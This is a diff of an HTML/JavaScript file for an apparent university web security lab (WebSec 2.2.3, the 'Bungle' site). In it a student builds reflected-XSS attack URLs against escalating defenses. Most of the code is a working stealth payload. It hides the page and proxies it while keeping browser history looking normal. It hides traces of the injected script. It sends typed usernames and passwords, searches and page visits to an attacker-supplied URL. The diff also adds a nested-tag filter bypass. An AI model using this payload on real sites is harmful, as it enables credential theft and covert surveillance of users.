@@ -1,139 +1,148 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-	<meta charset="utf-8">
-	<meta name="25380cc">
-	<title>WebSec 2.2.3</title>
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-<script>
+    <meta charset="utf-8">
+    <meta name="25380cc">
+    <title>WebSec 2.2.3</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script>
 
-// Inject this payload. 
-// You MAY create your own injection from scratch, but we recommend this template as a starting point:
-function payload(attacker) {
+        /* Inject this payload. 
+        You MAY create your own injection from scratch, but we recommend this template as a starting point: */
+        function payload(attacker) {
 
-    // This function can make it appear that a new page has been loaded
-    // Note that you can proxy the main page, or a search page!
-	function proxy(href, spying_url, shouldPush = true) {
+            /*This function can make it appear that a new page has been loaded
+            Note that you can proxy the main page, or a search page! */
+            function proxy(href, spying_url, shouldPush = true) {
 
-        	// Make all current HTML invisible.
-        	$('html').hide();
+                /* Make all current HTML invisible.*/
+                $('html').hide();
 
-        	// overwrites current HTML. Execute a callback function when load has finished.
-        	$('html').load(href, function() {
+                /* overwrites current HTML. Execute a callback function when load has finished.*/
+                $('html').load(href, function () {
 
-                // Show new HTML
-                $('html').show();
+                    /* Show new HTML*/
+                    $('html').show();
 
-                // TODO implement spying while being stealthy and persistent. Remove the alert.
-                //alert("Notice that although we injected code into the search page, you see here the main page!")
-                // <NEED TO USE PUSH STATE TO ENSURE THE HISTORY IS NOT SREWED UP>
-                if (shouldPush) {
-                    history.pushState(null, document.title, href)
-                }
-                
-                window.onpopstate = function(e) {
-                    e.preventDefault();
-                    var backLink = e.target.location.href;
-                    console.log(e);
-                    console.log(backLink);
-                    proxy(backLink, spying_url, false);
-                }
-
-                const bar = document.createElement('div')
-                bar.style = "background-color: red; width: 100%; height: 50px;"
-                document.querySelector('div.navbar-default').prepend(bar);
-                    
-                var uName = $("#logged-in-user",this).text();
-                if (uName) {
-                    var sendLink = `${spying_url}?event=nav&user=${uName}&url=${document.location.href}`;
-                    $.get(sendLink);
-                } else {
-                    var sendLink = `${spying_url}?event=nav&url=${document.location.href}`;
-                    $.get(sendLink);
-                }
-
-                Array.from(document.getElementsByClassName('history-item')).forEach(function(link){
-                    var txt = $(link).text();
-                    if (txt.includes("<script>")){
-                        $(link).hide();
+                    /*TODO implement spying while being stealthy and persistent. Remove the alert.
+                    alert("Notice that although we injected code into the search page, you see here the main page!")
+                     <NEED TO USE PUSH STATE TO ENSURE THE HISTORY IS NOT SREWED UP>*/
+                    if (shouldPush) {
+                        history.pushState(null, document.title, href);
                     }
-                });
 
-                // This is the login/register form
-                $('.well > .form-inline').submit(function(e) {
-                    e.preventDefault();
-                    //e.stopPropagation();
-                    var form = this;
-                    var uName = $("input[name='username']",this).val(); 
-                    var uPass = $("input[name='password']",this).val(); 
-                    console.log(uName,uPass);
-                    var spyLink = `${spying_url}?event=login&user=${uName}&pass=${uPass}`;
-                    console.log(spyLink);
-                    $.get(spyLink);
-                    $.post($(form).attr('action'), $(form).serialize(), function() {
-                        proxy('./', spying_url);
+                    window.onpopstate = function (e) {
+                        e.preventDefault();
+                        var backLink = e.target.location.href;
+                        console.log(e);
+                        console.log(backLink);
+                        proxy(backLink, spying_url, false);
+                    };
+
+                    const bar = document.createElement('div');
+                    bar.style = "background-color: red; width: 100%; height: 50px;";
+                    document.querySelector('div.navbar-default').prepend(bar);
+
+                    var uName = $("#logged-in-user", this).text();
+                    if (uName) {
+                        var sendLink = `${spying_url}?event=nav&user=${uName}&url=${document.location.href}`;
+                        $.get(sendLink);
+                    } else {
+                        var sendLink = `${spying_url}?event=nav&url=${document.location.href}`;
+                        $.get(sendLink);
+                    }
+
+                    Array.from(document.getElementsByClassName('history-item')).forEach(function (link) {
+                        var txt = $(link).text();
+                        if (txt.includes("<scrscriptipt>") || txt.includes("<script>")) {
+                            $(link).hide();
+                        } 
                     });
-                })
-                // This is the logout form
-                $('.navbar-nav > .navbar-form').submit(function(e){
-                    e.preventDefault()
-                    var form = this;
-                    var uName = $("#logged-in-user",this).text();
-                    console.log(uName);
-                    var spyLink = `${spying_url}?event=logout&user=${uName}`;
-                    $.get(spyLink);
-                    $.post($(form).attr('action'), $(form).serialize(), function() {
-                        proxy('./', spying_url);
+
+                    /* This is the login/register form*/
+                    $('.well > .form-inline').submit(function (e) {
+                        e.preventDefault();
+                        var form = this;
+                        var uName = $("input[name='username']", this).val();
+                        var uPass = $("input[name='password']", this).val();
+                        console.log(uName, uPass);
+                        var spyLink = `${spying_url}?event=login&user=${uName}&pass=${uPass}`;
+                        console.log(spyLink);
+                        $.get(spyLink);
+                        $.post($(form).attr('action'), $(form).serialize(), function () {
+                            proxy('./', spying_url);
+                        });
                     });
-                })
-                // This is the search form
-                $('.search-well > .form-inline').submit(function(e){
-                    e.preventDefault();
-                    var form = this;
-                    var query = $('input[name=q]', this).val();
-                    console.log(query);
-                    const target_href = `./search?q=${query}`;
-                    const spyLink = `${spying_url}?event=search&q=${query}`;
-                    $.get(spyLink);
-                    proxy(target_href, spying_url);
+                    /*This is the logout form*/
+                    $('.navbar-nav > .navbar-form').submit(function (e) {
+                        e.preventDefault();
+                        var form = this;
+                        var uName = $("#logged-in-user", this).text();
+                        console.log(uName);
+                        var spyLink = `${spying_url}?event=logout&user=${uName}`;
+                        $.get(spyLink);
+                        $.post($(form).attr('action'), $(form).serialize(), function () {
+                            proxy('./', spying_url);
+                        });
+                    });
+                    /*This is the search form*/
+                    $('.search-well > .form-inline').submit(function (e) {
+                        e.preventDefault();
+                        var form = this;
+                        var query = $('input[name=q]', this).val();
+                        console.log(query);
+                        const target_href = `./search?q=${query}`;
+                        const spyLink = `${spying_url}?event=search&q=${query}`;
+                        $.get(spyLink);
+                        proxy(target_href, spying_url);
+                    });
+
+                    $('a').click(function (e) {
+                        e.preventDefault();
+                        var lnk = e.target.href;
+                        console.log(lnk);
+                        proxy(lnk, spying_url);
+                    });
                 });
+            }
+            /*Call Proxy*/
+            history.replaceState(null, document.title, "./");
+            proxy('./', attacker);
+        }
 
-                $('a').click(function(e){
-                    e.preventDefault();
-                    var lnk = e.target.href;
-                    console.log(lnk);
-                    proxy(lnk,spying_url);
-                });
-            });
-    	}
-    //Call Proxy
-    history.replaceState(null, document.title, "./")
-    proxy('./', attacker)
-}
+        function makeLink(target, attacker, defense) {
 
-function makeLink(target, attacker, defense) {
+            /* Encode your payload function as a string */
+            payload_string = payload.toString();
 
-    // Encode your payload function as a string 
-    payload_string = payload.toString();
+            console.log(payload_string);
 
-    switch(defense) {
-        case 1:
-            // TODO: Implement XSS warmup 2.2.3.1
-            return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=" + encodeURIComponent(
-                `<script>setTimeout(function(){document.getElementsByTagName("a")[0].href="http://ece.illinois.edu/";},10);`
-                + "</script" + ">");
+            switch (defense) {
+                case 1:
+                    // TODO: Implement XSS warmup 2.2.3.1
+                    return "http://bungle-cs461.csl.illinois.edu/multivac/?name=" + encodeURIComponent(
+                        `<script>setTimeout(function(){document.getElementsByTagName("a")[0].href="http://ece.illinois.edu/";},10);`
+                        + "</script" + ">");
         case 2:
             // TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
                 encodeURIComponent(
                     "<script>" +
-                    payload_string + 
-                    ";payload('"+attacker+"');" + 
+                    payload_string +
+                    ";payload('" + attacker + "');" +
                     "</script" + ">"
                 );
         case 3:
             // TODO: generate XSS URL for defense level 2.2.3.3
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+                encodeURIComponent(
+                    "<scrscriptipt>" +
+                    payload_string +
+                    ";payload('" + attacker + "');" +
+                    "</scrscriptipt" + ">"
+                );
+            // return target + "/search?xssdefense=" + (defense-2) + "&q=" + encodeURIComponent(`<body onload="(function(){${payload_string};alert('hello world');})();">`); 
         case 4:
             // TODO: generate XSS URL payload for defense level 2.2.3.4
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
@@ -170,5 +179,5 @@ $(function() {
     <h3 id="defense5"></h3>
     <h3 id="defense6"></h3>
 </body>
-</html>
 
+</html>
